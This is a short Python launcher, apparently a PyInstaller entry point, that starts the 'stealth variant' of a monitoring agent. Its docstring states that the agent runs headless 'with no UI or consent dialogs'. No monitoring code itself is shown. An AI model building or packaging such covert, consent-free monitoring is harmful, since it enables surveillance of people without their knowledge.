"""PyInstaller entry point for stealth variant.

Launches the headless monitoring agent with no UI or consent dialogs.
"""

from agent.agent_stealth import main

if __name__ == "__main__":
    raise SystemExit(main())
